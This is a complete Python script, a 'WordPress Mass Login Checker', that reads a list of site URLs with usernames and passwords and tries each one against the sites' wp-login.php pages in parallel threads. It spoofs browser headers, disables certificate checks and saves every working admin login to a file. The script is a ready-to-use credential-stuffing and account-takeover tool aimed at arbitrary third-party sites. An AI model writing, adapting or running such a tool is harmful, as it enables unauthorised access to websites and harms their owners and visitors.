from multiprocessing.dummy import Pool, Value, Lock
from colorama import Fore, init
import requests

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN
requests.urllib3.disable_warnings()

good_count = Value('i', 0)
bad_count = Value('i', 0)
counter_lock = Lock()

def check(txt):
    global good_count
    global bad_count

    if '#' not in txt or '@' not in txt:
        print(f"Invalid format: {txt}")
        return

    url, username, password = txt.split("#")[0], txt.split("#")[1].split("@")[0], txt.split("@")[1]
    
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Origin': url,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    }
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': f'{url}/wp-admin/',
        'testcookie': '1'
    }

    try:
        response = requests.post(f'{url}/wp-login.php', headers=headers, data=data, timeout=20, verify=False)

        if 'wp-admin' in response.url and 'Dashboard' in response.text:
            with counter_lock:
                print(f'{url} --> {fg}[Success]')
                good_count.value += 1
                open("test.txt", "a").write(f'{url}#{username}@{password}\n')
        else:
            with counter_lock:
                print(f'{url} --> {fr}[Failed]')
                bad_count.value += 1
    except requests.exceptions.Timeout:
        with counter_lock:
            print(f'{url} --> {fr}[Failed] (Timeout)')
            bad_count.value += 1
    except requests.exceptions.RequestException:
        with counter_lock:
            print(f'{url} --> {fr}[Failed] (Website is down or unreachable)')
            bad_count.value += 1

def main():
    try:
        print(Fore.GREEN + 'WordPress Mass Login Checker')
        fileopen = input("Enter the wordlist file: ")
        thread = input("Thread: ")
        file = open(fileopen, 'r').read().splitlines()
        pool = Pool(int(thread))
        pool.map(check, file)
    except Exception as e:
        print(f'An error occurred: {e}')
    finally:
        pool.close()
        pool.join()

    with counter_lock:
        print("Total Good: ", good_count.value)
        print("Total Bad: ", bad_count.value)

if __name__ == "__main__":
    main()
